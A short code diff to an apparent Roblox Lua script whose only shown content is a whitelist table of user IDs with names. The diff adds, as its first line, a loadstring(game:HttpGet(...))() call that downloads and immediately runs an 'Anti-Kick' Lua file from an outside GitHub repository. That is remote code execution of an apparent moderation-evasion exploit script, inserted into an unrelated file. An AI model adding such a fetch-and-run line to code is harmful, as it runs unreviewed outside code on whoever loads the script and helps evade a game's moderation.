@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Anti-Kick/main/Anti-Kick.lua"))()
 local whitelist = {
 	[5534883615] = true,  -- Gusta
 	[5544575348] = true,  -- Gyro
